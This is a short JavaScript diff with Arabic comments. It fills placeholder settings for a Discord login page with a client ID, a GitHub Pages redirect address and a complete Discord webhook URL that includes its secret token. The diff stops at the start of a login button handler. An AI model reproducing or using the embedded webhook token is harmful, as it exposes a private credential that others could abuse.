@@ -1,7 +1,7 @@
 // ضع هنا بيانات تطبيق ديسكورد وويب هوك الخاص بك
-const CLIENT_ID = "ضع هنا client id الخاص بك";
-const REDIRECT_URI = "ضع هنا رابط الموقع بعد تسجيل الدخول"; // مثال: https://yourdomain.com
-const WEBHOOK_URL = "ضع هنا رابط ويب هوك ديسكورد";
+const CLIENT_ID = "1244667808529387665";
+const REDIRECT_URI = "https://mayfvzxvxz-prog.github.io/da7m.bot/"; // مثال: https://yourdomain.com
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1403049111414116563/oPOnDaR8oxRdkcsgiShUR9aaug_8CJRB5ocJhrYxy5rleFFAUXDLgOWp_IM-2fWJfxs4";
 
 // زر تسجيل الدخول
 document.getElementById('login-discord').onclick = function() {
